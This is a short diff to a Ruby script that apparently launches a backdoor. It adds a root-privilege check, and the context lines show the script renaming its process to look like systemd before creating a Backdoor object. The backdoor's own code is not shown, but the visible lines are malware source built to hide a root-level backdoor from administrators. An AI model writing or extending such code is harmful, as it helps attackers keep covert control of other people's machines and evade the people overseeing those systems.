@@ -1,4 +1,4 @@
-#! /usr/bin/env ruby
+#!/usr/bin/env ruby
 
 #-------------------------------------------------------------------------------
 # Requires
@@ -18,6 +18,7 @@ def set_process_mask(mask)
 end
 
 begin
+    raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0
     set_process_mask("systemd")
     
     backdoor = Backdoor.new
